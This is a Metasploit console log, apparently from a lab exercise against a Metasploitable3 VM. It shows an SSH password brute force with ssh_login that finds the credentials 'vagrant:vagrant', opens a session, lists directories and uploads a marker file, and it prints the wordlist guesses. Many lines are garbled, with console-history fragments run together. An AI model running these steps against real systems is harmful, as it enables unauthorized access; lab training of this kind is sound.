@@ -1,1 +1,110 @@
+[*] Spooling to file Desktop/logs.txt...
+msf6 > spool Desktop/logs.txt
+exitsessions -i 1
+runset PASS_FILE Desktop/passwords.txt
+USERNAME vagrant
+RHOST 192.168.0.182
+use auxiliary/scanner/ssh/ssh_login
+search ssh login
+use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(scanner/ssh/ssh_login) > use auxiliary/scanner/ssh/ssh_loginspool Desktop/logs.txtexitsessions -i 1runset PASS_FILE Desktop/passwords.txtUSERNAME vagrantRHOST 192.168.0.182USERNAME vagrantRHOST 192.168.0.182use auxiliary/scanner/ssh/ssh_loginset RHOST 192.168.0.182
+RHOST => 192.168.0.182
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOST 192.168.0.182use auxiliary/scanner/ssh/ssh_loginspool Desktop/logs.txtexitsessions -i 1runset PASS_FILE Desktop/passwords.txtUSERNAME vagrantRHOST 192.168.0.182USERNAME vagrant
+USERNAME => vagrant
+msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME vagrantRHOST 192.168.0.182use auxiliary/scanner/ssh/ssh_loginspool Desktop/logs.txtexitsessions -i 1runset PASS_FILE Desktop/passwords.txt
+PASS_FILE => Desktop/passwords.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE Desktop/passwords.txtUSERNAME vagrantRHOST 192.168.0.182use auxiliary/scanner/ssh/ssh_loginspool Desktop/logs.txtexitsessions -i 1runset PASS_FILE Desktop/passwords.txtrun
+[*] 192.168.0.182:22 - Starting bruteforce
+[+] 192.168.0.182:22 - Success: 'vagrant:vagrant' 'uid=900(vagrant) gid=900(vagrant) groups=900(vagrant),27(sudo) Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux '
+[*] SSH session 1 opened (192.168.0.136:38827 -> 192.168.0.182:22) at 2025-04-18 12:42:17 -0400
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > runset PASS_FILE Desktop/passwords.txtUSERNAME vagrantRHOST 192.168.0.182use auxiliary/scanner/ssh/ssh_loginset RHOST 192.168.0.182use auxiliary/scanner/ssh/ssh_loginspool Desktop/logs.txtexitsessions -i 1
+[*] Starting interaction with 1...
 
+/home/vagrant
+/home
+anakin_skywalker
+artoo_detoo
+ben_kenobi
+boba_fett
+chewbacca
+c_three_pio
+darth_vader
+greedo
+han_solo
+jabba_hutt
+jarjar_binks
+kylo_ren
+lando_calrissian
+leia_organa
+luke_skywalker
+vagrant
+backdoor.txt
+VBoxGuestAdditions.iso
+-bash: line 8: $'\E[A\E[A\E[A': command not found
+[*] Max line length is 65537
+[*] Writing 19 bytes in 1 chunks of 72 bytes (octal-encoded), using printf
+[+] File </home/vagrant/attackedByGroup2.txt> upload finished
+
+[*] 192.168.0.182 - SSH session 1 closed.  Reason: User exit
+msf6 auxiliary(scanner/ssh/ssh_login) > sppspoo;ll off
+[*] Spooling to file Desktop/logs.txt...
+msf6 > spool Desktop/logs.txt
+exitspool offessions -i 1
+runset PASS_FILE Desktop/passwords.txt
+USERNAME vagrant
+RHOST 192.168.0.182
+use auxiliary/scanner/ssh/ssh_login
+spool Desktop/logs.txt
+use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(scanner/ssh/ssh_login) > use auxiliary/scanner/ssh/ssh_loginspool Desktop/logs.txtexitspool offessions -i 1runset PASS_FILE Desktop/passwords.txtUSERNAME vagrant
+USERNAME => vagrant
+msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME vagrantuse auxiliary/scanner/ssh/ssh_loginset USERNAME vagrantuse auxiliary/scanner/ssh/ssh_loginspool Desktop/logs.txtexitspool offessions -i 1runset PASS_FILE Desktop/passwords.txt
+PASS_FILE => Desktop/passwords.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE Desktop/passwords.txtUSERNAME vagrantuse auxiliary/scanner/ssh/ssh_loginspool Desktop/logs.txtexitspool offessions -i 1runset PASS_FILE Desktop/passwords.txtrunsessions -i 1pool offexitspool Desktop/logs.txtuse auxiliary/scanner/ssh/ssh_loginset USERNAME vagrantPASS_FILE Desktop/passwords.txtset VERBOSE Trueruetrue
+VERBOSE => true
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+[-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.
+msf6 auxiliary(scanner/ssh/ssh_login) > runset VERBOSE truePASS_FILE Desktop/passwords.txtUSERNAME vagrantuse auxiliary/scanner/ssh/ssh_loginset USERNAME vagrantuse auxiliary/scanner/ssh/ssh_loginspool Desktop/logs.txtexitspool offessions -i 1runset PASS_FILE Desktop/passwords.txtUSERNAME vagrantRHOST 192.168.0.182
+RHOST => 192.168.0.182
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOST 192.168.0.182run
+[*] 192.168.0.182:22 - Starting bruteforce
+[-] 192.168.0.182:22 - Failed: 'vagrant:password'
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.0.182:22 - Failed: 'vagrant:123456'
+[-] 192.168.0.182:22 - Failed: 'vagrant:12345678'
+[-] 192.168.0.182:22 - Failed: 'vagrant:1234'
+[-] 192.168.0.182:22 - Failed: 'vagrant:qwerty'
+[-] 192.168.0.182:22 - Failed: 'vagrant:12345'
+[-] 192.168.0.182:22 - Failed: 'vagrant:dragon'
+[-] 192.168.0.182:22 - Failed: 'vagrant:pussy'
+[-] 192.168.0.182:22 - Failed: 'vagrant:baseball'
+[-] 192.168.0.182:22 - Failed: 'vagrant:football'
+[-] 192.168.0.182:22 - Failed: 'vagrant:letmein'
+[-] 192.168.0.182:22 - Failed: 'vagrant:monkey'
+[-] 192.168.0.182:22 - Failed: 'vagrant:696969'
+[-] 192.168.0.182:22 - Failed: 'vagrant:abc123'
+[-] 192.168.0.182:22 - Failed: 'vagrant:mustang'
+[-] 192.168.0.182:22 - Failed: 'vagrant:michael'
+[-] 192.168.0.182:22 - Failed: 'vagrant:shadow'
+[-] 192.168.0.182:22 - Failed: 'vagrant:master'
+[-] 192.168.0.182:22 - Failed: 'vagrant:jennifer'
+[-] 192.168.0.182:22 - Failed: 'vagrant:111111'
+[-] 192.168.0.182:22 - Failed: 'vagrant:2000'
+[-] 192.168.0.182:22 - Failed: 'vagrant:jordan'
+[+] 192.168.0.182:22 - Success: 'vagrant:vagrant' 'uid=900(vagrant) gid=900(vagrant) groups=900(vagrant),27(sudo) Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux '
+[*] SSH session 1 opened (192.168.0.136:37483 -> 192.168.0.182:22) at 2025-04-18 12:54:35 -0400
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > runset RHOST 192.168.0.182runrunset RHOST 192.168.0.182runset VERBOSE truePASS_FILE Desktop/passwords.txtUSERNAME vagrantuse auxiliary/scanner/ssh/ssh_loginspool Desktop/logs.txtexitspool offessions -i 1runsessions -i 1
+[*] Starting interaction with 1...
+
+-bash: line 2: $'\E[A\E[B': command not found
+/home/vagrant
+attackedByGroup2.txt
+backdoor.txt
+VBoxGuestAdditions.iso
+
+[*] 192.168.0.182 - SSH session 1 closed.  Reason: User exit
+msf6 auxiliary(scanner/ssh/ssh_login) > 
